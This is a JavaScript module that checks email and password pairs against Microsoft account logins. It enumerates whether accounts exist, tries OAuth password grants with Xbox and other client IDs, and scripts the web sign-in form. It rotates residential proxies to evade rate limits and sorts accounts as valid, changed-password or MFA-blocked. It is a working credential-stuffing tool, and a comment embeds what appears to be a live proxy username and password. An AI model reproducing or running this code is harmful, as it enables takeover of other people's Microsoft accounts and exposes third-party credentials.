/**
 * Microsoft checker — SOAX / residential proxy friendly
 *
 * Env (pick one):
 *   MS_CHECK_PROXY=http://user:pass@host:port
 *   MS_CHECK_PROXY=socks5://user:pass@host:port
 *   MS_CHECK_PROXIES=host:port:user:pass,host2:port2:user:pass
 *
 * SOAX example:
 *   MS_CHECK_PROXY=http://network-res_mob:mhfLveDKfR@proxy.soax.com:1337
 */
const MSG = {
  NO_EMAIL: "This Email doesn't exist",
  NOT_LOGINABLE: 'Not loginable',
  PASS_CHANGED: 'password was changed by original user',
  OK: 'Login OK'
};

const UA =
  'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36';

let _ready = false;
let _list = [];
let _idx = 0;
let _agent = null; // socks agent
let _dispatcher = null; // undici
let _active = '';
let _mode = 'direct';

function safe(u) {
  return String(u || '').replace(/\/\/([^/@]+)@/, '//***:***@');
}

function parseLine(line) {
  line = String(line || '').trim();
  if (!line) return null;
  if (/^(socks5h?|socks4|https?):\/\//i.test(line)) return line;

  // user:pass@host:port  (SOAX style without scheme)
  const at = line.lastIndexOf('@');
  if (at > 0) {
    const auth = line.slice(0, at);
    const hostport = line.slice(at + 1);
    const ci = auth.indexOf(':');
    if (ci > 0 && hostport.includes(':')) {
      const user = auth.slice(0, ci);
      const pass = auth.slice(ci + 1);
      return (
        'http://' +
        encodeURIComponent(user) +
        ':' +
        encodeURIComponent(pass) +
        '@' +
        hostport
      );
    }
  }

  // host:port:user:pass
  const p = line.split(':');
  if (p.length >= 4) {
    const host = p[0];
    const port = p[1];
    const user = p[2];
    const pass = p.slice(3).join(':');
    return (
      'http://' +
      encodeURIComponent(user) +
      ':' +
      encodeURIComponent(pass) +
      '@' +
      host +
      ':' +
      port
    );
  }
  return null;
}

function loadList() {
  const raw = [process.env.MS_CHECK_PROXY, process.env.MS_CHECK_PROXIES, process.env.HTTPS_PROXY]
    .filter(Boolean)
    .join(',');
  return String(raw)
    .split(/[\n,;]+/)
    .map((s) => parseLine(s.trim()))
    .filter(Boolean);
}

function init() {
  if (_ready) return;
  _ready = true;
  _list = loadList();
  if (!_list.length) {
    console.log('[msCheck] No MS_CHECK_PROXY set');
    return;
  }
  console.log('[msCheck] proxies:', _list.length);
  use(0);
}

function use(i) {
  if (!_list.length) return;
  _idx = i % _list.length;
  _active = _list[_idx];
  _agent = null;
  _dispatcher = null;
  const socks = /^socks/i.test(_active);
  if (socks) {
    try {
      const { SocksProxyAgent } = require('socks-proxy-agent');
      _agent = new SocksProxyAgent(_active);
      _mode = 'socks';
      console.log('[msCheck] SOCKS', _idx + 1, safe(_active));
    } catch (e) {
      console.error('[msCheck] socks fail', e.message);
      _mode = 'error';
    }
    return;
  }
  try {
    const undici = require('undici');
    _dispatcher = new undici.ProxyAgent({
      uri: _active,
      requestTls: { rejectUnauthorized: false }
    });
    _mode = 'http';
    console.log('[msCheck] HTTP', _idx + 1, safe(_active));
  } catch (e) {
    console.error('[msCheck] http proxy fail', e.message);
    _mode = 'error';
  }
}

function rotate() {
  if (_list.length < 2) return false;
  use(_idx + 1);
  return true;
}

function hdr(h) {
  const o = { 'User-Agent': UA, Accept: '*/*' };
  if (!h) return o;
  if (typeof h.forEach === 'function') h.forEach((v, k) => (o[k] = v));
  else Object.assign(o, h);
  return o;
}

function socksReq(urlStr, method, headers, body) {
  const http = require('http');
  const https = require('https');
  const { URL } = require('url');
  const u = new URL(urlStr);
  const lib = u.protocol === 'https:' ? https : http;
  const payload = body == null ? null : Buffer.from(String(body), 'utf8');
  const headers2 = Object.assign({}, headers);
  if (payload) headers2['Content-Length'] = String(payload.length);

  return new Promise((resolve, reject) => {
    const req = lib.request(
      {
        hostname: u.hostname,
        port: u.port || (u.protocol === 'https:' ? 443 : 80),
        path: u.pathname + u.search,
        method,
        headers: headers2,
        agent: _agent,
        timeout: 60000,
        rejectUnauthorized: false
      },
      (inc) => {
        const chunks = [];
        inc.on('data', (c) => chunks.push(c));
        inc.on('end', () => {
          const buf = Buffer.concat(chunks);
          const rh = inc.headers || {};
          resolve({
            ok: inc.statusCode >= 200 && inc.statusCode < 300,
            status: inc.statusCode,
            headers: {
              get: (n) => {
                const v = rh[String(n).toLowerCase()];
                return Array.isArray(v) ? v[0] : v || null;
              },
              getSetCookie: () => {
                const sc = rh['set-cookie'];
                return !sc ? [] : Array.isArray(sc) ? sc : [sc];
              }
            },
            text: async () => buf.toString('utf8'),
            json: async () => JSON.parse(buf.toString('utf8') || '{}')
          });
        });
      }
    );
    req.on('error', reject);
    req.on('timeout', () => {
      req.destroy();
      reject(new Error('proxy timeout'));
    });
    if (payload) req.write(payload);
    req.end();
  });
}

async function msFetch(url, opts = {}) {
  init();
  let method = (opts.method || 'GET').toUpperCase();
  let body = opts.body;
  const headers = hdr(opts.headers);
  const redirect = opts.redirect || 'follow';
  let current = url;

  for (let hop = 0; hop < 8; hop++) {
    let res;
    try {
      if (_agent) {
        res = await socksReq(current, method, headers, body);
      } else if (_dispatcher) {
        const undici = require('undici');
        res = await undici.fetch(current, {
          method,
          headers,
          body,
          redirect: 'manual',
          dispatcher: _dispatcher
        });
      } else {
        res = await fetch(current, { method, headers, body, redirect: 'manual' });
      }
    } catch (e) {
      const err = new Error('Proxy/network: ' + e.message);
      err.cause = e;
      throw err;
    }

    const loc = res.headers.get('location');
    if (redirect === 'follow' && res.status >= 300 && res.status < 400 && loc) {
      current = new URL(loc, current).toString();
      if (res.status !== 307 && res.status !== 308) {
        method = 'GET';
        body = undefined;
      }
      continue;
    }
    return res;
  }
  throw new Error('Too many redirects');
}

async function probeProxy() {
  init();
  if (!_list.length) return { ok: false, error: 'No MS_CHECK_PROXY set' };
  try {
    const res = await msFetch('https://api.ipify.org?format=json', { redirect: 'follow' });
    const data = await res.json().catch(() => ({}));
    return { ok: res.status === 200, ip: data.ip, status: res.status, proxy: safe(_active), mode: _mode };
  } catch (e) {
    return { ok: false, error: e.message, proxy: safe(_active), mode: _mode };
  }
}

async function getCredentialType(email) {
  const res = await msFetch('https://login.live.com/GetCredentialType.srf?mkt=EN-US&id=292841', {
    method: 'POST',
    headers: {
      'Content-Type': 'application/json; charset=utf-8',
      Accept: 'application/json',
      Origin: 'https://login.live.com',
      Referer: 'https://login.live.com/'
    },
    body: JSON.stringify({
      username: email,
      uaid: '',
      isOtherIdpSupported: true,
      checkPhones: false,
      isRemoteNGCSupported: true,
      isCookieBannerShown: false,
      isFidoSupported: true,
      forceotclogin: false,
      otclogindisallowed: false,
      isExternalFederationDisallowed: false,
      isRemoteConnectSupported: false,
      federationFlags: 0,
      isSignup: false,
      flowToken: ''
    })
  });
  const data = await res.json().catch(() => null);
  return { data, http: res.status };
}

function fromCT(data) {
  if (!data || typeof data !== 'object') return { known: false };
  const code = data.IfExistsResult;
  if (code === 1 || code === 4) return { known: true, exists: false, msg: MSG.NO_EMAIL };
  if (![0, 2, 5, 6].includes(code)) return { known: false, code };
  const creds = data.Credentials || {};
  if (creds.HasPassword === false) {
    return { known: true, exists: true, hasPassword: false, msg: MSG.NOT_LOGINABLE };
  }
  if (creds.FederationRedirectUrl && creds.HasPassword === false) {
    return { known: true, exists: true, hasPassword: false, msg: MSG.NOT_LOGINABLE };
  }
  return {
    known: true,
    exists: true,
    hasPassword: creds.HasPassword === true || creds.HasPassword === undefined
  };
}

function mapOauth(data, http) {
  if (http === 200 && (data.access_token || data.refresh_token)) {
    return { definitive: true, ok: true, msg: MSG.OK };
  }
  const codes = [].concat(data.error_codes || []).map(String);
  const desc = String(data.error_description || data.error_message || data.message || data.error || '');
  const blob = (codes.join(' ') + ' ' + desc).toLowerCase();

  if (codes.includes('50034') || /aadsts50034|does not exist|user not found/i.test(blob)) {
    return { definitive: true, ok: false, msg: MSG.NO_EMAIL };
  }
  if (codes.includes('50126') || /aadsts50126|invalid username or password|password is incorrect/i.test(blob)) {
    return { definitive: true, ok: false, msg: MSG.PASS_CHANGED };
  }
  if (
    codes.some((c) => ['50076', '50079', '50072', '50158', '50140', '53003'].includes(c)) ||
    /aadsts50076|multi-factor|mfa required|strong authentication/i.test(blob)
  ) {
    return { definitive: true, ok: false, msg: MSG.NOT_LOGINABLE };
  }
  if (codes.some((c) => ['50057', '50005', '50053'].includes(c))) {
    return { definitive: true, ok: false, msg: MSG.NOT_LOGINABLE };
  }
  return { definitive: false, raw: desc.slice(0, 180) };
}

async function oauthTry(email, password, clientId, tokenUrl, scope) {
  const body = new URLSearchParams({
    grant_type: 'password',
    client_id: clientId,
    username: email,
    password,
    scope
  });
  if (tokenUrl.includes('login.live.com')) {
    body.set('redirect_uri', 'https://login.live.com/oauth20_desktop.srf');
  }
  const res = await msFetch(tokenUrl, {
    method: 'POST',
    headers: { 'Content-Type': 'application/x-www-form-urlencoded', Accept: 'application/json' },
    body: body.toString()
  });
  const data = await res.json().catch(() => ({}));
  return mapOauth(data, res.status);
}

async function htmlPasswordCheck(email, password) {
  const loginUrl = 'https://login.live.com/login.srf?wa=wsignin1.0&mkt=en-US&id=292841';
  const pageRes = await msFetch(loginUrl, {
    headers: { Accept: 'text/html', 'Accept-Language': 'en-US,en;q=0.9' },
    redirect: 'follow'
  });
  const html = await pageRes.text();
  const ppft =
    (html.match(/name="PPFT"[^>]*value="([^"]+)"/i) || [])[1] ||
    (html.match(/"sFT":"([^"]+)"/i) || [])[1] ||
    '';
  let urlPost =
    (html.match(/urlPost:"([^"]+)"/i) || [])[1] ||
    (html.match(/urlPost:'([^']+)'/i) || [])[1] ||
    'https://login.live.com/ppsecure/post.srf';
  urlPost = urlPost.replace(/\\u0026/g, '&').replace(/\\\//g, '/');

  if (!ppft) return { definitive: false, reason: 'no_ppft' };

  const form = new URLSearchParams({
    login: email,
    loginfmt: email,
    passwd: password,
    PPFT: ppft,
    type: '11',
    LoginOptions: '3',
    NewUser: '1',
    PPSX: 'Passp',
    ps: '2',
    i13: '0',
    i19: '12000',
    IsFidoSupported: '1'
  });

  const postRes = await msFetch(urlPost, {
    method: 'POST',
    headers: {
      'Content-Type': 'application/x-www-form-urlencoded',
      Origin: 'https://login.live.com',
      Referer: loginUrl
    },
    body: form.toString(),
    redirect: 'manual'
  });
  const loc = postRes.headers.get('location') || '';
  const body = await postRes.text().catch(() => '');
  const all = (body + '\n' + loc).toLowerCase();

  if (/account\.microsoft\.com|office\.com|onedrive|completesignin/i.test(loc)) {
    if (/proof|identity|otp|interrupt/i.test(loc + body)) {
      return { definitive: true, ok: false, msg: MSG.NOT_LOGINABLE };
    }
    return { definitive: true, ok: true, msg: MSG.OK };
  }
  if (/password is incorrect|account or password is incorrect/i.test(all)) {
    return { definitive: true, ok: false, msg: MSG.PASS_CHANGED };
  }
  if (/doesn'?t exist|couldn'?t find an account/i.test(all)) {
    return { definitive: true, ok: false, msg: MSG.NO_EMAIL };
  }
  if (/other ways to sign in|use a code|authenticator|verify your identity/i.test(all)) {
    if (/name="passwd"/i.test(body) && /incorrect/i.test(all)) {
      return { definitive: true, ok: false, msg: MSG.PASS_CHANGED };
    }
    if (!/name="passwd"/i.test(body)) {
      return { definitive: true, ok: false, msg: MSG.NOT_LOGINABLE };
    }
  }
  return { definitive: false, reason: 'html_inconclusive', http: postRes.status };
}

async function tryWorker(email, password) {
  const base = String(process.env.PASS_WORKER_URL || '').replace(/\/$/, '');
  if (!base) return null;
  try {
    const res = await msFetch(base + '/check', {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ email, password, type: 'check' })
    });
    return await res.json().catch(() => null);
  } catch (e) {
    return { error: e.message };
  }
}

function mapWorker(data) {
  if (!data) return null;
  if (data.ok === true || data.status === 'success') return { ok: true, summary: MSG.OK, error: null };
  const err = String(data.error || data.message || '').toLowerCase();
  if (!err) return null;
  if (/50034|not exist|doesn'?t exist|no account/.test(err)) {
    return { ok: false, summary: MSG.NO_EMAIL, error: MSG.NO_EMAIL };
  }
  if (/50126|incorrect|wrong password|invalid username or password/.test(err)) {
    return { ok: false, summary: MSG.PASS_CHANGED, error: MSG.PASS_CHANGED };
  }
  if (/50076|mfa|2fa|not loginable|no password|otp/.test(err)) {
    return { ok: false, summary: MSG.NOT_LOGINABLE, error: MSG.NOT_LOGINABLE };
  }
  return null;
}

async function checkMicrosoft(email, password) {
  init();
  email = String(email || '')
    .trim()
    .toLowerCase();
  password = String(password || '');
  const details = { steps: [], proxyCount: _list.length };

  if (!email.includes('@')) {
    return { ok: false, summary: MSG.NO_EMAIL, error: MSG.NO_EMAIL, details };
  }
  if (!password) {
    return { ok: false, summary: MSG.PASS_CHANGED, error: MSG.PASS_CHANGED, details };
  }

  // 1) Proxy connectivity test first
  const probe = await probeProxy();
  details.probe = probe;
  details.steps.push(probe.ok ? 'proxy IP ' + probe.ip : 'proxy fail: ' + (probe.error || probe.status));

  if (_list.length && !probe.ok) {
    // try rotate once if multi
    if (rotate()) {
      const probe2 = await probeProxy();
      details.probe2 = probe2;
      if (!probe2.ok) {
        const msg =
          'Proxy not working: ' +
          (probe2.error || probe.error || 'auth/connect failed') +
          '\nCheck MS_CHECK_PROXY user/pass/host. SOAX HTTP format:\n' +
          'http://USER:PASS@proxy.soax.com:1337';
        return { ok: false, summary: msg, error: msg, details };
      }
    } else {
      const msg =
        'Proxy not working: ' +
        (probe.error || 'connect failed') +
        '\nVerify SOAX is active and env is:\nMS_CHECK_PROXY=http://network-res_mob:PASSWORD@proxy.soax.com:1337';
      return { ok: false, summary: msg, error: msg, details };
    }
  }

  const worker = await tryWorker(email, password);
  if (worker) {
    const m = mapWorker(worker);
    if (m) return { ...m, details };
  }

  const rounds = Math.max(1, _list.length || 1);
  for (let r = 0; r < rounds; r++) {
    if (r > 0) rotate();
    details.proxy = safe(_active || 'direct');
    details.steps.push('round ' + (r + 1));

    try {
      const ct = await getCredentialType(email);
      details.ct = ct.data;
      const info = fromCT(ct.data);
      details.exists = info;
      if (info.known && info.exists === false) {
        return { ok: false, summary: MSG.NO_EMAIL, error: MSG.NO_EMAIL, details };
      }
      if (info.msg === MSG.NOT_LOGINABLE) {
        return { ok: false, summary: MSG.NOT_LOGINABLE, error: MSG.NOT_LOGINABLE, details };
      }
    } catch (e) {
      details.steps.push('ct err ' + e.message);
    }

    for (const [id, url, scope] of [
      ['000000004C12AE6F', 'https://login.live.com/oauth20_token.srf', 'service::user.auth.xboxlive.com::MBI_SSL'],
      ['00000000402b5328', 'https://login.live.com/oauth20_token.srf', 'service::user.auth.xboxlive.com::MBI_SSL'],
      [
        '1f907974-e22b-4810-a9de-d282292ec59c',
        'https://login.microsoftonline.com/consumers/oauth2/v2.0/token',
        'openid offline_access'
      ]
    ]) {
      try {
        const o = await oauthTry(email, password, id, url, scope);
        if (o.definitive) {
          return { ok: !!o.ok, summary: o.msg, error: o.ok ? null : o.msg, details };
        }
      } catch (e) {
        details.steps.push('oauth ' + e.message);
      }
    }

    try {
      const h = await htmlPasswordCheck(email, password);
      details.html = h;
      if (h.definitive) {
        return { ok: !!h.ok, summary: h.msg, error: h.ok ? null : h.msg, details };
      }
    } catch (e) {
      details.steps.push('html ' + e.message);
    }
  }

  if (details.exists && details.exists.exists === true) {
    const msg =
      'Account exists — password not verified (Microsoft still limited this IP). Try SOCKS5:\nsocks5://USER:PASS@proxy.soax.com:1337';
    return { ok: false, summary: msg, error: msg, details };
  }

  const msg =
    'Check failed. Proxy IP: ' +
    (probe.ip || 'unknown') +
    '. Mode: ' +
    (probe.mode || _mode) +
    '. Try socks5:// in MS_CHECK_PROXY or another SOAX port/package.';
  return { ok: false, summary: msg, error: msg, details };
}

module.exports = { checkMicrosoft, MSG, probeProxy };
